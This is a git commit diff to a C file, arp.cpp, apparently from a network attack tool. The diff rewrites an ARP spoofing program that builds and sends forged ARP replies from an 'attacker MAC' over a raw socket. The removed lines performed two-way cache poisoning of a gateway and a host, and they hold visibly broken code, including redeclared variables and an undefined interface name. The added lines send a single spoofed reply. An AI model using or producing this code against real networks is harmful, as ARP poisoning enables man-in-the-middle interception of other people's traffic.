86bedec2fbddde3cf14e0d9d3cbc0015dd40c8d6
flashnuke <adanikel@gmail.com>
2025-04-24 22:13:47 +0300

    update arp.cpp

--- apk/src/arp.cpp
+++ apk/src/arp.cpp
@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/ioctl.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <netinet/if_ether.h>
@@ -9,17 +10,14 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
-#define ETH_HDR_LEN sizeof(struct ether_header)
-#define ARP_PKT_LEN sizeof(struct ether_arp)
-#define BUF_SIZE   (ETH_HDR_LEN + ARP_PKT_LEN)
-
-// parse “aa:bb:cc:dd:ee:ff” into 6 bytes
-int parse_mac(const char *str, unsigned char *bytes) {
-    int vals[6];
+int parse_mac(const char* str, unsigned char* bytes) {
+    int values[6];
     if (6 == sscanf(str, "%x:%x:%x:%x:%x:%x",
-                    &vals[0], &vals[1], &vals[2],
-                    &vals[3], &vals[4], &vals[5])) {
-        for (int i = 0; i < 6; i++) bytes[i] = (unsigned char)vals[i];
+                    &values[0], &values[1], &values[2],
+                    &values[3], &values[4], &values[5])) {
+        for (int i = 0; i < 6; ++i) {
+            bytes[i] = (unsigned char)values[i];
+        }
         return 0;
     }
     return -1;
@@ -27,127 +25,84 @@ int parse_mac(const char *str, unsigned char *bytes) {
 
 int main(int argc, char *argv[]) {
     if (argc != 7) {
-        fprintf(stderr,
-            "Usage: %s <iface> <host_ip> <host_mac> "
-            "<gw_ip> <gw_mac> <attacker_mac>\n",
-            argv[0]
-        );
-        return EXIT_FAILURE;
+        fprintf(stderr, "Usage: %s <iface> <source IP> <source MAC> <dest IP> <dest MAC> <attacker MAC>\n", argv[0]);
+        return -1;
     }
 
-    const char *iface        = argv[1];
-    const char *host_ip_str  = argv[2];
-    const char *host_mac_str = argv[3];
-    const char *gw_ip_str    = argv[4];
-    const char *gw_mac_str   = argv[5];
-    const char *atk_mac_str  = argv[6];
+    const char *iface     = argv[1];
+    const char *src_ip_str  = argv[2];
+    const char *src_mac_str = argv[3];
+    const char *dst_ip_str  = argv[4];
+    const char *dst_mac_str = argv[5];
+    const char *att_mac_str = argv[6];
 
-    unsigned char host_mac[6], gw_mac[6], atk_mac[6];
-    if (parse_mac(host_mac_str, host_mac) ||
-        parse_mac(gw_mac_str,   gw_mac)  ||
-        parse_mac(atk_mac_str,  atk_mac)) {
-        fprintf(stderr, "Invalid MAC format\n");
-        return EXIT_FAILURE;
+    unsigned char src_mac[6], dst_mac[6], att_mac[6];
+    if (parse_mac(src_mac_str, src_mac) != 0 ||
+        parse_mac(dst_mac_str, dst_mac) != 0 ||
+        parse_mac(att_mac_str, att_mac) != 0) {
+        fprintf(stderr, "Invalid MAC address format\n");
+        return -2;
     }
 
-    struct in_addr host_ip, gw_ip;
-    if (inet_pton(AF_INET, host_ip_str, &host_ip) != 1 ||
-        inet_pton(AF_INET, gw_ip_str,   &gw_ip)   != 1) {
+    struct in_addr src_ip, dst_ip;
+    if (inet_pton(AF_INET, src_ip_str, &src_ip) != 1 ||
+        inet_pton(AF_INET, dst_ip_str, &dst_ip) != 1) {
         fprintf(stderr, "Invalid IP address\n");
-        return EXIT_FAILURE;
+        return -3;
     }
 
-    // raw socket for ARP
     int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (sock < 0) {
         perror("socket");
-        return EXIT_FAILURE;
+        return -4;
     }
 
-    // interface index
     int ifindex = if_nametoindex(iface);
     if (ifindex == 0) {
         perror("if_nametoindex");
         close(sock);
-        return EXIT_FAILURE;
+        return -5;
     }
 
-    // common buffers
-    unsigned char buffer[BUF_SIZE];
-    struct ether_header *eh = (struct ether_header*)buffer;
-    struct ether_arp    *arp = (struct ether_arp*)(buffer + ETH_HDR_LEN);
-    struct sockaddr_ll   sa = {0};
+    /* Build ARP reply payload */
+    struct ether_arp arp;
+    arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
+    arp.ea_hdr.ar_pro = htons(ETH_P_IP);
+    arp.ea_hdr.ar_hln = ETHER_ADDR_LEN;
+    arp.ea_hdr.ar_pln = sizeof(in_addr_t);
+    arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
+    memcpy(arp.arp_sha, src_mac, sizeof(arp.arp_sha));
+    memcpy(&arp.arp_spa, &src_ip, sizeof(src_ip));
+    memcpy(arp.arp_tha, dst_mac, sizeof(arp.arp_tha));
+    memcpy(&arp.arp_tpa, &dst_ip, sizeof(dst_ip));
+
+    /* Build Ethernet header */
+    struct ether_header eh;
+    memcpy(eh.ether_shost, att_mac, sizeof(eh.ether_shost));
+    memcpy(eh.ether_dhost, dst_mac, sizeof(eh.ether_dhost));
+    eh.ether_type = htons(ETH_P_ARP);
+
+    /* Prepare socket address */
+    struct sockaddr_ll sa = {0};
     sa.sll_family   = AF_PACKET;
     sa.sll_protocol = htons(ETH_P_ARP);
     sa.sll_ifindex  = ifindex;
     sa.sll_halen    = ETH_ALEN;
+    memcpy(sa.sll_addr, dst_mac, ETH_ALEN);
 
-    // --- 1) Poison gateway: “host_ip is at atk_mac” (unicast) ---
-    // Ethernet header
-    memcpy(eh->ether_shost, atk_mac, ETH_ALEN);
-    memcpy(eh->ether_dhost, gw_mac, ETH_ALEN);
-    eh->ether_type = htons(ETH_P_ARP);
-    // ARP payload
-    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
-    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
-    arp->ea_hdr.ar_hln = ETH_ALEN;
-    arp->ea_hdr.ar_pln = sizeof(in_addr_t);
-    arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);
-    memcpy(arp->arp_sha, atk_mac,  ETH_ALEN);      // use attacker MAC!
-    memcpy(&arp->arp_spa, &host_ip, sizeof(host_ip));
-    memcpy(arp->arp_tha, gw_mac, ETH_ALEN);
-    memcpy(&arp->arp_tpa, &gw_ip, sizeof(gw_ip));
-    // send
-    memcpy(sa.sll_addr, gw_mac, ETH_ALEN);
-    if (sendto(sock, buffer, BUF_SIZE, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
-        perror("sendto gateway");
-    }
+    /* Combine headers + ARP payload */
+    unsigned char buffer[sizeof(eh) + sizeof(arp)];
+    memcpy(buffer, &eh, sizeof(eh));
+    memcpy(buffer + sizeof(eh), &arp, sizeof(arp));
 
-    // --- 2) Poison host: “gw_ip is at atk_mac” (broadcast → host’s cache) ---
-    // assume: buffer points to a chunk at least ETHER_HDR_LEN + ARP_HDR_LEN
-    struct ether_header *eh = (void*)buffer;
-    struct arp_header   *arp= (void*)(buffer + ETHER_HDR_LEN);
-
-    // 1) Build Ethernet header
-    unsigned char bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
-    memcpy(eh->ether_dhost, bcast,    ETH_ALEN);
-    memcpy(eh->ether_shost, atk_mac,  ETH_ALEN);
-    eh->ether_type = htons(ETH_P_ARP);
-
-    // 2) Build ARP header
-    arp->htype = htons(ARPHRD_ETHER);
-    arp->ptype = htons(ETH_P_IP);
-    arp->hlen  = ETH_ALEN;
-    arp->plen  = 4;
-    arp->oper  = htons(ARPOP_REPLY);
-    memcpy(arp->arp_sha, atk_mac, ETH_ALEN);
-    {
-        uint32_t spa = htonl(gw_ip);
-        memcpy(&arp->arp_spa, &spa, sizeof(spa));
-    }
-    memcpy(arp->arp_tha, host_mac, ETH_ALEN);
-    {
-        uint32_t tpa = htonl(host_ip);
-        memcpy(&arp->arp_tpa, &tpa, sizeof(tpa));
-    }
-
-    // 3) Prepare sockaddr_ll
-    struct sockaddr_ll sa = {0};
-    sa.sll_family   = AF_PACKET;
-    sa.sll_protocol = htons(ETH_P_ARP);
-    sa.sll_ifindex  = if_nametoindex(ifname);
-    sa.sll_hatype   = ARPHRD_ETHER;
-    sa.sll_pkttype  = PACKET_BROADCAST;
-    sa.sll_halen    = ETH_ALEN;
-    memcpy(sa.sll_addr, bcast, ETH_ALEN);
-
-    // 4) Send it
-    size_t pkt_len = ETHER_HDR_LEN + ARP_HDR_LEN;
-    if (sendto(sock, buffer, pkt_len, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
+    /* Send the packet */
+    if (sendto(sock, buffer, sizeof(buffer), 0,
+               (struct sockaddr*)&sa, sizeof(sa)) < 0) {
         perror("sendto");
+        close(sock);
+        return -6;
     }
-
 
     close(sock);
-    return EXIT_SUCCESS;
+    return 0;
 }
